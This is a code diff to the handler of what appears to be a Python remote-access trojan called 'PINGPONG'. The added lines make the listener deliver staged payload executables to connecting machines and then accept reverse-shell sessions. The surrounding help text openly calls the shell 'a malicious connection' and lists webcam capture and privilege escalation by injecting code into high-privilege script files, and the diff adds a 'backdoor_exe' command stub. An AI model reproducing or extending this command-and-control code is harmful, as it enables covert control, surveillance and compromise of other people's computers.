@@ -9,6 +9,7 @@ import sys
 import main, config_set
 import threading
 import ctypes
+import os
 import inspect
 def _async_raise(tid, exctype):
   """raises the exception, performs cleanup if needed"""
@@ -66,13 +67,35 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
         sys.exit(1)
     if printf:
         main.print_normal('handler>[*]Starting handler at ' + ip + ":" + str(port))
-
     while True:
         try:
             conn, addr = s.accept()
         except KeyboardInterrupt:
             main.print_normal("handler>[*]Stoping......")
             main.main()
+        _basic_ip = addr[0]
+        conn.send(b'OK')
+        len_id = conn.recv(1024).decode('utf8')
+        conn.send(b'OK')
+        payload_id = conn.recv(int(len_id)).decode('utf8')
+        payload_id = payload_id + '.exe'
+        if os.path.isfile(f'./payload/upload_payload/{payload_id}'):
+            conn.send(b'OK')
+            with open(f'./payload/upload_payload/{payload_id}', 'rb') as f:
+                se_data = f.read()
+                main.print_normal(f'handler>[*]Sending bytes : {len(se_data)} bytes to {_basic_ip}')
+                conn.send(bytes(str(len(se_data)), 'utf8'))
+                conn.recv(1024)
+                conn.send(se_data)
+                conn.close()
+                s.close()
+                break
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((ip, port))
+    s.listen(10)
+    while True:
+        conn, addr = s.accept()
         _ip = addr[0]
         _port = addr[1]
         connect_pool.append([conn, ip, port, _ip, _port, 'PINGPONG session'])
@@ -123,6 +146,8 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
             cam_shot : take shot
             priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
             main.print_warn("PINGPONG>[!]type 'show_usage' to print out all the activate usage")
+        elif command == 'backdoor_exe' or command == 'BACKDOOR_EXE':
+            pass
         elif command == 'bg' or command == 'BG':
             main.print_normal('PINGPONG[*]>backgrounding session......')
             if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
